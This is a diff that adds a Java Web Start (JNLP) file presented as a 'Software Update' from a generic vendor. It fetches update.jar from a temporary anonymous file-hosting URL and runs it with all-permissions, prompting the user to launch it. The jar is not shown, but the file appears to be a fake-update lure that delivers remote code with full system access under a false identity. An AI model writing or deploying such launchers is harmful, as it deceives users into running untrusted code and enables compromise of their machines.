@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<jnlp spec="1.0+" codebase="https://tmpfiles.org/dl/17938788/" href="update.jnlp">
+    <information>
+        <title>Software Update</title>
+        <vendor>MySoftwareCorp</vendor>
+        <description>A software update for MySoftware</description>
+    </information>
+<security>
+ <all-permissions/>
+ </security>
+ <update check="always" policy="prompt-run"/>
+    <resources>
+        <jar href="https://tmpfiles.org/dl/17938788/update.jar" main="true"/>
+    </resources>
+    <application-desc main-class="com.mysoftware.updater.UpdateApp"/>
+</jnlp>
